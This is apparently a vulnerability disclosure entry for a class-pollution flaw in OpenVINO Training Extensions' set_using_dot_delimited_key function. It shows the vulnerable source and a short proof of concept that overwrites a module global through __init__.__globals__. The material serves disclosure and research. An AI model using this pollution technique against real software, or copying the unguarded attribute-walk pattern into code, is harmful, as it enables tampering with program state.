## OpenVINO™ Training Extensions

### Meta

+ Library: OpenVINO™ Training Extensions
+ Stars: 1.2K
+ Version: v2.2.2
+ CVE: N/A
+ Status: Pending
+ Payload: ```otx.engine.hpo.hpo_trial.set_using_dot_delimited_key("__init__.__globals__.__name__", "polluted", obj)```
+ Foundby: BlackPyrl
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/openvinotoolkit/training_extensions

### Vulnerable Code Snippet

```
def set_using_dot_delimited_key(key: str, val: Any, target: Any) -> None:  # noqa: ANN401
    """Set values to attribute in target object using dot delimited key.

    For example, if key is "a.b.c", then value is set at 'target.a.b.c'.
    Target should be object having attributes, dictionary or list.
    To get an element in a list, an integer that is the index of corresponding value can be set as a key.

    Args:
        key (str): dot delimited key.
        val (Any): value to set.
        target (Any): target to set value to.
    """
    splited_key = key.split(".")
    for each_key in splited_key[:-1]:
        if isinstance(target, dict):
            target = target[each_key]
        elif isinstance(target, list):
            if not each_key.isdigit():
                error_msg = f"Key should be integer but '{each_key}'."
                raise ValueError(error_msg)
            target = target[int(each_key)]
        else:
            target = getattr(target, each_key)

    if isinstance(target, dict):
        target[splited_key[-1]] = val
    elif isinstance(target, list):
        if not splited_key[-1].isdigit():
            error_msg = f"Key should be integer but '{splited_key[-1]}'."
            raise ValueError(error_msg)
        target[int(splited_key[-1])] = val
    else:
        setattr(target, splited_key[-1], val)
```
### PoC

```
from otx.engine.hpo.hpo_trial import set_using_dot_delimited_key

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

try:
    set_using_dot_delimited_key("__init__.__globals__.__name__", "polluted", obj)
except:
    pass

print(__name__)
```